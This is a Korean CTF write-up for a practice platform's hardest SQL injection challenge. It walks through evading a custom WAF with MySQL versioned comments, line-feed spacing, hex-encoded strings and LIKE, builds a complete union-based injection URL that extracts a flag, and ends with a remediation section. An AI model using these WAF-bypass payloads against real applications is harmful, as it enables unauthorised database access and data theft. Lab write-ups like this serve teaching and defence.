+++
title = "VulnABLE CTF [LUXORA] Write-up: SQL Injection 🔱 Diamond"
description = "LUXORA 플랫폼의 최고 난이도 SQL Injection 상세 공략 (Custom WAF 우회 및 복합 페이로드 체이닝)"
date = 2026-03-14
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "SQL Injection", "Diamond", "WAF Bypass", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: SQL Injection 🔱 Diamond

## 🎯 챌린지 개요
- **카테고리**: Injection Layer (SQLi)
- **난이도**: 🔱 Diamond
- **타겟 경로**: `/sqli/diamond`
- **목표**: 강력한 Custom WAF(Web Application Firewall)가 적용된 환경에서, 필터링 규칙을 완벽히 회피하는 창의적인 페이로드를 작성하여 숨겨진 플래그를 탈취하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 WAF 필터 분석 (Reconnaissance)

`/sqli/diamond` 페이지는 제품 리뷰 ID를 통해 리뷰 내용을 불러오는 엔드포인트입니다.
```http
GET /sqli/diamond?review_id=1
```

이전 난이도에서 사용했던 SQL 인젝션 기법들(`'`, `OR`, `SLEEP`)을 시도해 봅니다.

### WAF(웹 방화벽) 반응 확인
페이로드 테스트 결과, 다음과 같은 응답들이 돌아왔습니다.
```html
<p class="error">[WAF BLOCK] Suspicious character detected: ' </p>
<p class="error">[WAF BLOCK] Suspicious keyword detected: SELECT </p>
```

**[해커의 사고 과정 (제약 조건 분석)]**
수동 퍼징(Fuzzing)을 통해 알아낸 WAF의 차단 룰셋은 다음과 같습니다.
1. **차단된 기호**: 공백(` `), 홑따옴표(`'`), 쌍따옴표(`"`), 등호(`=`)
2. **차단된 키워드**: `SELECT`, `UNION`, `OR`, `AND`, `WHERE` 등 대소문자를 불문하고 SQL 주요 예약어 전면 차단.

단순한 블랙리스트를 넘어 정규표현식으로 꽤 꼼꼼하게 필터링을 하고 있습니다. sqlmap 같은 자동화 도구는 WAF 블록에 막혀 전혀 작동하지 않습니다. 이제 100% 수작업으로 우회 페이로드를 설계해야 합니다.

---

## 💥 2. WAF 우회 전략 설계 (Bypass Strategy)

하나의 기법만으로는 뚫을 수 없습니다. 여러 가지 치환 기법을 하나로 엮는 **체이닝(Chaining)**이 필요합니다.

### 💡 Strategy 1: 키워드(SELECT, UNION) 우회
MySQL 등 일부 데이터베이스는 특정 버전에서만 실행되는 주석 문법(`/*!버전번호 SQL구문 */`)을 지원합니다.
WAF는 이를 단순 주석으로 취급해 무시하지만, MySQL 엔진은 이 안의 텍스트를 실행 가능한 SQL로 해석합니다.
- `SELECT` ➔ `/*!50000SELECT*/`
- `UNION` ➔ `/*!50000UNION*/`

### 💡 Strategy 2: 공백(Space) 우회
Silver 난이도에서 썼던 괄호나 주석 대신, URL 인코딩된 개행 문자(Line Feed)를 사용합니다.
- ` ` (공백) ➔ `%0A` (LF)

### 💡 Strategy 3: 홑따옴표(')와 등호(=) 우회
문자열을 홑따옴표 없이 표현하려면 **Hex 인코딩**을 사용합니다. 예를 들어 `admin`이라는 문자열은 Hex로 `0x61646d696e` 입니다.
등호(`=`) 연산자는 `LIKE` 구문으로 대체할 수 있습니다.
- `WHERE role = 'admin'` ➔ `/*!50000WHERE*/%0Arole%0ALIKE%0A0x61646d696e`

---

## 🚀 3. 공격 수행 및 페이로드 조립 (Exploitation)

위 전략들을 종합하여, 원래 작성하고자 했던 공격 쿼리를 WAF가 알아볼 수 없는 형태의 외계어(?)로 변환합니다.

### 원래 보내고 싶었던 쿼리 (Union-based SQLi)
앞의 결과를 무효화(`-1`)하고, `diamond_flags` 테이블에서 `role`이 `admin`인 데이터의 `flag_value`를 가져옵니다.
```sql
-1 UNION SELECT 1, 2, flag_value FROM diamond_flags WHERE role = 'admin'
```

### 🧩 WAF 우회 페이로드 조립
1. 공백 제거 및 `%0A` 삽입
2. 키워드를 `/*!50000 ... */` 로 래핑
3. `=` 와 `'admin'` 을 `LIKE` 와 `0x61646d696e` 로 변환

**[최종 완성된 URL]**
```http
GET /sqli/diamond?review_id=-1%0A/*!50000UNION*/%0A/*!50000SELECT*/%0A1,2,flag_value%0A/*!50000FROM*/%0Adiamond_flags%0A/*!50000WHERE*/%0Arole%0ALIKE%0A0x61646d696e
```

### 서버의 응답 (결과)
WAF는 이 기괴한 문자열 덩어리에서 차단 키워드를 하나도 발견하지 못하고 DB로 패스시킵니다.
DB 엔진은 이 주석들을 완벽한 SQL 쿼리로 해석하여 실행합니다!

```html
<div class="review-box">
  <p>Review ID: 1</p>
  <p>User ID: 2</p>
  <p>Content: FLAG{SQLI_🔱_DIAMOND_X9Y8Z7}</p>
</div>
```

---

## 🚩 4. 롸잇업 결론 및 플래그

WAF라는 보안 솔루션이 데이터베이스와 문자열을 해석하는 **'관점의 차이(Impedance Mismatch)'**를 악용하여, WAF는 속이고 DB는 실행하게 만드는 최고 난이도의 우회 공격을 성공시켰습니다.

**🔥 획득한 플래그:**
`FLAG{SQLI_🔱_DIAMOND_X9Y8Z7}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
WAF는 알려진 공격 패턴을 막는 1차 방어선일 뿐, 궁극적인 해결책이 아닙니다. 애플리케이션 코드가 취약하면 해커는 어떻게든 우회로를 찾아냅니다.

* **취약점의 본질**
WAF에 의존하여 백엔드 소스코드 자체는 여전히 문자열 결합(String Concatenation) 방식을 유지한 것이 패착입니다.

* **안전한 패치 (Type Casting 및 ORM 적용)**
입력값이 '숫자(ID)'라면 쿼리에 넣기 전에 반드시 숫자로 형변환(Casting)을 해야 합니다.
```javascript
// 입력값을 강제로 정수로 변환. 문자가 섞여 있으면 NaN이 되어 쿼리 실행이 실패함.
const safeId = parseInt(req.query.review_id, 10);
if (isNaN(safeId)) {
    return res.status(400).send("Invalid ID");
}

// 이후 Prepared Statement로 안전하게 실행
db.query("SELECT * FROM reviews WHERE id = $1", [safeId], ...);
```
이렇게 하면 해커가 아무리 현란한 Hex 코드나 주석을 섞어 보내도 `parseInt()` 단계에서 걸러져 데이터베이스 근처에도 가지 못하게 됩니다.